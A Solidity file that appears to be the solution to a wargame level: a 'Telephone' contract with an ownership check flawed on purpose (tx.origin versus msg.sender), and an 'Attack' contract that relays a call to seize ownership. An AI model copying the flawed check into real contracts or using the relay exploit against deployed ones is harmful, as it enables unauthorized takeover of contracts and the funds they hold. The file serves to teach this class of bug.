// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack {
    Telephone public telephone;

    constructor(Telephone _telephone) {
        telephone = Telephone(_telephone);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}